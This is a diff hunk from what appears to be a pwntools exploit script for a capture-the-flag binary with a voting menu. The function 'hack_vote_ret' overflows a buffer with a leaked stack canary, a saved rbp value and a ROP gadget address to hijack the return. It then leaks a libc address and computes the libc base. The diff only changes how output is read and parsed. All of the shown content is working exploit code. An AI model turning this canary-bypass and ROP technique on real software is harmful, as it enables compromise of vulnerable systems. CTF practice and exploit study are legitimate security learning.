@@ -50,16 +50,17 @@ def hack_vote_ret(canary, base):
     #                           |msg | cannary   |   rbp       |   ret            |)
     r.sendlineafter('Message: ', msg + canary    +  rbp        + p64(pop_r14r15_ret))
 
-    # quit voting --> GET libc base
     r.sendlineafter('>', '3')
     # recv the menu, and eat it out
-    print('first recv --> ', r.recv())
-    recv_str = r.recv().split()
+    print('first recv --> ', r.recvuntil('>'))
+    recv_str = r.recvuntil('>')
     print('and then --> ', recv_str)
 
     libc_base = 0
-    libc_base = u64(recv_str[-1] + '\0\0') - 0x201ab0
+    libc_base = u64(recv_str + '\0\0') - 0x201ab0
     print('libc_base --> ', hex(libc_base))
+
+    r.sendline('3')
 
     return libc_base
 
